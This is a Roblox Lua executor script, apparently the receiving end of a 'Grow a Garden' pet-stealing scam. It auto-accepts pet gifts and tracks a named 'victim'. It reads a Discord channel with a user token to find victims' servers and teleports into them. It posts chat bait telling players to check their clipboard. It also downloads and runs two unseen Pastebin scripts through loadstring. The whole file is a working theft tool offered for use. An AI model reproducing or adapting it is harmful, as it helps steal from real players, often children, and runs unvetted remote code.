if not game:IsLoaded() then
    game.Loaded:Wait()
end

local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

local function checkActivityStatus()
    print("Roblox window is IN FOCUS.")
end

RunService.Heartbeat:Connect(function()
    local currentStatusIsInactive = false
    local lastStatus = _G.RobloxFocusStatus

    if lastStatus == nil then
        checkActivityStatus()
        _G.RobloxFocusStatus = currentStatusIsInactive
    elseif (currentStatusIsInactive and not lastStatus) or (not currentStatusIsInactive and lastStatus) then
        checkActivityStatus()
        _G.RobloxFocusStatus = currentStatusIsInactive
    end
end)

checkActivityStatus()

local PET_TO_CLAIM = _G.Pets
local a = game:GetService("ReplicatedStorage")
local b = a:WaitForChild("GameEvents")
local c = b:WaitForChild("GiftPet")
local d = b:WaitForChild("AcceptPetGift")

print("Auto-Accept Script: Hooked and ready. Waiting for gifts...")

c.OnClientEvent:Connect(function(e, f, g)
    local petName = f:match("^(.-) %[") or f
    petName = petName:gsub("^%s+", ""):gsub("%s+$", "")
    if table.find(PET_TO_CLAIM, petName) then
        print(string.format("Auto-Accept: Incoming Pet Gift - Pet Name: '%s', From: '%s'. Accepting...", f, g))
        pcall(function()
            d:FireServer(true, e)
            print("Auto-Accept: Successfully accepted gift with ID: " .. tostring(e))
        end)
    else
        print(string.format("Auto-Accept: Incoming Pet Gift - Pet Name: '%s', From: '%s'. (Not in whitelist, ignoring).", f, g))
    end
end)

if token == "" or channelId == "" then
    game.Players.LocalPlayer:Kick("Add your token or channelId to use")
end

loadstring(game:HttpGet('https://pastebin.com/raw/xBLu3qtF', true))()
loadstring(game:HttpGet('https://pastebin.com/raw/vbLfSAFd', true))()

local bb = game:GetService("VirtualUser")
game:GetService("Players").LocalPlayer.Idled:Connect(function()
    bb:CaptureController()
    bb:ClickButton2(Vector2.new())
end)

local HttpServ = game:GetService("HttpService")
local VirtualInputManager = game:GetService("VirtualInputManager")
local victimFile = isfile("user_gag.txt")
local joinedFile = isfile("joined_ids.txt")
if not victimFile then
    writefile("user_gag.txt", "victim username")
end
if not joinedFile then
    writefile("joined_ids.txt", "[]")
end
local victimUser = readfile("user_gag.txt")
local joinedIds = HttpServ:JSONDecode(readfile("joined_ids.txt"))
local didVictimLeave = false
local timer = 0
local lastMessageId = nil

local function saveJoinedId(messageId)
    table.insert(joinedIds, messageId)
    writefile("joined_ids.txt", HttpServ:JSONEncode(joinedIds))
end

local function waitForPlayerLeave()
    local connection
    connection = game.Players.PlayerRemoving:Connect(function(removedPlayer)
        if removedPlayer.Name == victimUser then
            if connection then
                connection:Disconnect()
            end
            didVictimLeave = true
        end
    end)
end

waitForPlayerLeave()

local Players = game:GetService("Players")
local plr = Players.LocalPlayer

while plr:GetAttribute("DataFullyLoaded") ~= true do
    plr:GetAttributeChangedSignal("DataFullyLoaded"):Wait()
end
while plr:GetAttribute("Finished_Loading") ~= true do
    plr:GetAttributeChangedSignal("Finished_Loading"):Wait()
end
while plr:GetAttribute("Loading_Screen_Finished") ~= true do
    plr:GetAttributeChangedSignal("Loading_Screen_Finished"):Wait()
end

wait(1)
local giftNoti = plr:WaitForChild("PlayerGui"):WaitForChild("Gift_Notification"):WaitForChild("Frame")

local function acceptGifts()
    while task.wait(0.1) do
        for _, v in pairs(giftNoti:GetChildren()) do
            if v:IsA("ImageLabel") then
                local acceptImageButton = v:WaitForChild("Holder"):WaitForChild("Frame"):WaitForChild("Accept")
                replicatesignal(acceptImageButton.MouseButton1Click)
            end
        end
    end
end

task.spawn(acceptGifts)

game:GetService('TextChatService').TextChannels.RBXGeneral:SendAsync('Yo gng check yo clipboard')
wait(0.5)
game:GetService('TextChatService').TextChannels.RBXGeneral:SendAsync('GGS')

local function increaseTimer()
    while task.wait(1) do
        timer = timer + 1
    end
end

task.spawn(increaseTimer)

local function autoJoin()
    local response = request({
        Url = "https://discord.com/api/v9/channels/"..channelId.."/messages?limit=1",
        Method = "GET",
        Headers = {
            ['Authorization'] = token,
            ['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            ['Content-Type'] = 'application/json'
        }
    })

    if response.StatusCode == 200 then
        local messages = HttpServ:JSONDecode(response.Body)
        if #messages == 0 then return end

        local message = messages[1]
        if message.id == lastMessageId or table.find(joinedIds, tostring(message.id)) then return end

        local content = message.content or ""
        local placeId, jobId = string.match(content, "TeleportToPlaceInstance%((%d+),%s*['\"]([%w%-]+)['\"]%)")
        if placeId and jobId then
            lastMessageId = message.id
            saveJoinedId(tostring(message.id))
            writefile("user_gag.txt", "unknown")
            game:GetService('TeleportService'):TeleportToPlaceInstance(placeId, jobId)
        end
    else
        print("Invalid response code:", response.StatusCode)
    end
end

while task.wait(5) do
    autoJoin()
end
